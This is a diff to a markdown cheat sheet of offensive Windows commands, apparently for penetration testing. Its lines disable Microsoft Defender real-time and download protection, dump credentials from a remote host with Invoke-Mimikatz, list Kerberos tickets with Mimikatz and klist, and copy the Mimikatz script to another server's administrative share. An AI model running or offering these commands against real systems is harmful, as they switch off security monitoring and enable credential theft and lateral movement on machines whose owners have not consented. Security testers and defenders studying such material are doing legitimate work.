@@ -57,6 +57,8 @@ OR If already running-
 #### MS Bypass
 ```Set-MpPreference -DisableIOAVProtection $true```
 ```Set-MpPreference -DisableRealtimeMonitoring $true```
+#### Kerberos Tickets
+```klist```
 
 # PS Ingress
 
@@ -208,7 +210,7 @@ If functions not on remote host:-
 
 ```Invoke-Mimikatz -ComputerName -DumpCreds```
 
-```Invoke-Mimikatz -ComputerName -Command kerberos::list```
+```Invoke-Mimikatz -ComputerName -Command "kerberos::list"```
 
 ##### Copy Across
 ```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
